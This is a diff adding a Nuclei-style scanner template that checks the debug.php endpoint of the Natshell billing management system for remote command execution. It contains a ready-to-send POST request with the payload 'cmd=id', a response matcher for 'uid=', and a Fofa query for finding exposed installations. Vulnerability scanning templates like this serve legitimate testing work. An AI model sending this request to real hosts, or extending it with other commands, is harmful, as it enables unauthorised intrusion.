@@ -1,0 +1,32 @@
+id: Natshell_debug_Command_execution
+
+info:
+  name: Natshell_debug_Command_execution
+  author: HK
+  severity: high
+  description: 蓝海卓越计费管理系统/debug.php接口存在远程命令执行漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="http://www.natshell.com"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /debug.php?_t=1 HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+    X-Requested-With: XMLHttpRequest
+    Content-Length: 6
+
+    cmd=id
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - uid=
